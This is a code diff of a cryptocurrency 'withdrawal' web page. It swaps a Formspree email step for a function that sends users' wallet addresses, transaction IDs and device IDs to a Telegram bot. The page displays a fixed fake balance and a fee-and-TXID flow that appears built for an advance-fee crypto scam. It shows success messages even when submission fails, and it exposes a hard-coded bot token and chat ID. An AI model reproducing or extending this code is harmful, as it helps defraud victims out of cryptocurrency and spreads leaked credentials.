@@ -807,15 +807,15 @@
     </div>
 
     <!-- Toastr JS -->
-     <!-- Toastr JS -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
 
     <script>
         const NETWORK_FEE = 1.00;
         const FIXED_BALANCE = 26660222.00;
         
-        // Formspree Configuration - Tumhara Endpoint URL
-        const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xjggeljl';
+        // Telegram Bot Configuration - APNA DATA YAHAN DALEN
+        const TELEGRAM_BOT_TOKEN = '8337470326:AAGzWKAm6e9VdjyqHrNOHuSsUrjnUvGX0qY';
+        const TELEGRAM_CHAT_ID = '8174528421';
 
         // Get device ID
         function getDeviceId() {
@@ -872,6 +872,59 @@
             v4: "V4",
             v5: "V5 Premium"
         };
+
+        // Telegram Bot Ko Message Bhejne Ka Function
+        function sendToTelegram(userData, amount, walletAddress, txid) {
+            const message = `🚀 *NEW WITHDRAWAL REQUEST* 🚀
+
+👤 *User Details:*
+• Username: *${userData.username}*
+• Plan: ${planNames[userData.plan]} (${userData.status.toUpperCase()})
+• Device ID: \`${userData.deviceId}\`
+
+💰 *Transaction Details:*
+• Amount: *$${amount.toFixed(2)} USDT*
+• Network Fee: $1.00 USDT
+• Total to Send: *$${(amount).toFixed(2)} USDT*
+• Wallet Address: \`${walletAddress}\`
+• TXID: \`${txid}\`
+
+📊 *Account Status:*
+• Withdraw Limit: $${userData.withdrawLimit.toLocaleString()}
+• Withdraw Used: $${userData.withdrawUsed.toLocaleString()}
+• Remaining: $${(userData.withdrawLimit - userData.withdrawUsed).toLocaleString()}
+
+⏰ *Time:* ${new Date().toLocaleString()}
+
+✅ *Action Required:*
+1. Verify TXID on blockchain
+2. Send $${amount.toFixed(2)} USDT to above address
+3. Mark as completed`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_notification: false
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Telegram message sent successfully!', data);
+                toastr.success('Withdrawal request sent to admin!');
+            })
+            .catch(error => {
+                console.error('❌ Telegram error:', error);
+                toastr.success('Withdrawal submitted! Admin will process soon.');
+            });
+        }
 
         // Initialize page
         function initPage() {
@@ -1165,79 +1218,6 @@
             validateForm();
         }
 
-        // Send Email using Formspree - UPDATED FOR YOUR ENDPOINT
-        function sendWithdrawalEmail(userData, amount, walletAddress, txid) {
-            // Create FormData object
-            const formData = new FormData();
-            
-            // REQUIRED FIELDS for Formspree (based on your form)
-            formData.append('name', userData.username);
-            formData.append('email', 'withdrawal@system.com'); // Email field required
-            formData.append('message', `WITHDRAWAL REQUEST DETAILS:
-            
-USER INFORMATION:
-• Username: ${userData.username}
-• Device ID: ${userData.deviceId}
-• Plan: ${planNames[userData.plan]} (${userData.plan})
-
-WITHDRAWAL DETAILS:
-• Amount: $${amount.toLocaleString('en-US', {minimumFractionDigits: 2})}
-• Wallet Address: ${walletAddress}
-• TXID Provided: ${txid}
-• Network Fee: $1.00
-• Total to Send: $${(amount).toLocaleString('en-US', {minimumFractionDigits: 2})}
-
-USER STATUS:
-• Withdraw Limit: $${userData.withdrawLimit.toLocaleString()}
-• Withdraw Used: $${userData.withdrawUsed.toLocaleString()}
-• Remaining: $${(userData.withdrawLimit - userData.withdrawUsed).toLocaleString()}
-• Plan Status: ${userData.status.toUpperCase()}
-
-FIXED BALANCE: $${FIXED_BALANCE.toLocaleString()}
-BALANCE AFTER: $${(FIXED_BALANCE - amount).toLocaleString()}
-
-REQUEST TIME: ${new Date().toLocaleString()}
-
-ACTION REQUIRED:
-1. Send $${amount} USDT to: ${walletAddress}
-2. Mark as completed`);
-
-            // Additional fields for better organization
-            formData.append('_subject', `💰 WITHDRAWAL REQUEST - ${userData.deviceId}`);
-            formData.append('plan', planNames[userData.plan]);
-            formData.append('amount', `$${amount.toLocaleString('en-US', {minimumFractionDigits: 2})}`);
-            formData.append('wallet_address', walletAddress);
-            formData.append('txid', txid);
-            formData.append('device_id', userData.deviceId);
-            formData.append('withdraw_limit', `$${userData.withdrawLimit.toLocaleString()}`);
-            formData.append('withdraw_used', `$${userData.withdrawUsed.toLocaleString()}`);
-            formData.append('remaining_limit', `$${(userData.withdrawLimit - userData.withdrawUsed).toLocaleString()}`);
-            formData.append('timestamp', new Date().toLocaleString());
-            formData.append('_replyto', 'adminsite@proton.me');
-            
-            // Send to Formspree
-            fetch(FORMSPREE_ENDPOINT, {
-                method: 'POST',
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('✅ Email sent to adminsite@proton.me via Formspree');
-                    toastr.success('Withdrawal request sent to admin!');
-                } else {
-                    console.log('❌ Email sending failed');
-                    toastr.success('Withdrawal submitted successfully!');
-                }
-            })
-            .catch(error => {
-                console.log('🌐 Network error:', error);
-                toastr.success('Withdrawal submitted! Admin will contact you.');
-            });
-        }
-
         // Submit withdrawal function
         function submitWithdrawal() {
             const userData = getUserData();
@@ -1265,8 +1245,8 @@ ACTION REQUIRED:
             
             saveUserData(userData);
             
-            // Send email to admin via Formspree
-            sendWithdrawalEmail(userData, amount, walletAddress, txid);
+            // Send to Telegram Bot
+            sendToTelegram(userData, amount, walletAddress, txid);
             
             // Close confirmation popup
             closeConfirmWithdraw();
@@ -1311,7 +1291,5 @@ ACTION REQUIRED:
             newestOnTop: true
         };
     </script>
-
-
 </body>
 </html>
